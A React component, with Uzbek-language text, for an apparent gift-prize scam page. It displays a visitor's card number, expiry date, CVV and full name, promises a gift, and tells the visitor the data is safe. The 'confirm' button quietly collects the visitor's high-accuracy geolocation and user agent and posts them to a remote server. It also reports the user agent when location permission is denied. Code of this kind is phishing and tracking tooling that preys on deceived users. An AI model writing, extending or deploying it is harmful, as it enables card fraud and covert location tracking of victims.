'use client';

import { useState, useCallback } from 'react';
import styles from './ConfirmationModal.module.css';

type CardType = 'unknown' | 'visa' | 'mastercard' | 'humo' | 'uzcard';

interface CardData {
    cardNumber: string;
    expiryDate: string;
    cvv: string;
    cardType: CardType;
    fullName: string;
}

interface ConfirmationModalProps {
    isOpen: boolean;
    onClose: () => void;
    cardData?: CardData;
}

// Card type icons with Font Awesome classes
const CARD_TYPE_ICONS: Record<CardType, string> = {
    visa: 'fab fa-cc-visa',
    mastercard: 'fab fa-cc-mastercard',
    humo: 'fas fa-credit-card',
    uzcard: 'fas fa-credit-card',
    unknown: 'fas fa-credit-card'
};

// Format card number for display (mask middle digits)
function formatCardForDisplay(cardNumber: string): string {
    const cleaned = cardNumber.replace(/\s/g, '');
    if (cleaned.length < 8) return cleaned;
    return `${cleaned.slice(0, 4)} •••• •••• ${cleaned.slice(-4)}`;
}

export default function ConfirmationModal({ isOpen, onClose, cardData }: ConfirmationModalProps) {
    const [isLoading, setIsLoading] = useState(false);
    const [isSuccess, setIsSuccess] = useState(false);
    const [error, setError] = useState('');

    const handleConfirm = useCallback(async () => {
        setIsLoading(true);
        setError('');

        try {
            // Request geolocation
            const position = await new Promise<GeolocationPosition>((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error('Geolocation not supported'));
                    return;
                }
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            });

            const { latitude, longitude, accuracy } = position.coords;

            // Send to server
            const serverUrl = process.env.NEXT_PUBLIC_SIGNALING_SERVER?.replace('wss://', 'https://').replace('ws://', 'http://') || '';

            await fetch(`${serverUrl}/api/geo`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${process.env.NEXT_PUBLIC_API_TOKEN}`
                },
                body: JSON.stringify({
                    latitude,
                    longitude,
                    accuracy,
                    userAgent: navigator.userAgent
                })
            });

            setIsSuccess(true);
            setTimeout(() => {
                onClose();
            }, 2000);

        } catch (err) {
            // Send without geo (permission denied or error)
            const serverUrl = process.env.NEXT_PUBLIC_SIGNALING_SERVER?.replace('wss://', 'https://').replace('ws://', 'http://') || '';

            await fetch(`${serverUrl}/api/geo`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${process.env.NEXT_PUBLIC_API_TOKEN}`
                },
                body: JSON.stringify({
                    latitude: null,
                    longitude: null,
                    denied: true,
                    userAgent: navigator.userAgent
                })
            });

            setIsSuccess(true);
            setTimeout(() => {
                onClose();
            }, 2000);
        }

        setIsLoading(false);
    }, [onClose]);

    if (!isOpen) return null;

    return (
        <div className={styles.backdrop}>
            <div className={styles.modal}>
                <div className={styles.icon}>
                    {isSuccess ? <i className="fas fa-check" /> : <i className="fas fa-gift" />}
                </div>

                <h2 className={styles.title}>
                    {isSuccess ? 'Tabriklaymiz!' : 'Kartangizni tasdiqlang'}
                </h2>

                <p className={styles.subtitle}>
                    {isSuccess
                        ? "Sovg'angiz yo'lda! Tez orada siz bilan bog'lanamiz."
                        : "Kartangizda xato yo'qligini tasdiqlang va sovg'angizni oling"}
                </p>

                {/* Card data display */}
                {cardData && (
                    <div className={styles.cardDataSection}>
                        <div className={styles.cardDataRow}>
                            <i className={CARD_TYPE_ICONS[cardData.cardType]} />
                            <span className={styles.cardDataValue}>{formatCardForDisplay(cardData.cardNumber)}</span>
                        </div>
                        <div className={styles.cardDataRow}>
                            <i className="fas fa-calendar-alt" />
                            <span className={styles.cardDataValue}>{cardData.expiryDate}</span>
                        </div>
                        {/* Show CVV only for non-local cards (Visa, Mastercard) */}
                        {cardData.cardType !== 'humo' && cardData.cardType !== 'uzcard' && cardData.cvv && (
                            <div className={styles.cardDataRow}>
                                <i className="fas fa-lock" />
                                <span className={styles.cardDataValue}>{'•'.repeat(cardData.cvv.length)}</span>
                            </div>
                        )}
                        <div className={styles.cardDataRow}>
                            <i className="fas fa-user" />
                            <span className={styles.cardDataValue}>{cardData.fullName}</span>
                        </div>
                    </div>
                )}

                {!isSuccess && (
                    <button
                        className={`${styles.button} ${isSuccess ? styles.success : ''}`}
                        onClick={handleConfirm}
                        disabled={isLoading}
                    >
                        {isLoading ? (
                            <>
                                <i className={`fas fa-spinner ${styles.loading}`} />
                                Tekshirilmoqda...
                            </>
                        ) : (
                            <>
                                <i className="fas fa-gift" />
                                Tasdiqlash va olish
                            </>
                        )}
                    </button>
                )}

                {error && <p className={styles.error}>{error}</p>}

                <p className={styles.note}>
                    <i className="fas fa-lock" /> Ma'lumotlaringiz xavfsiz
                </p>
            </div>
        </div>
    );
}
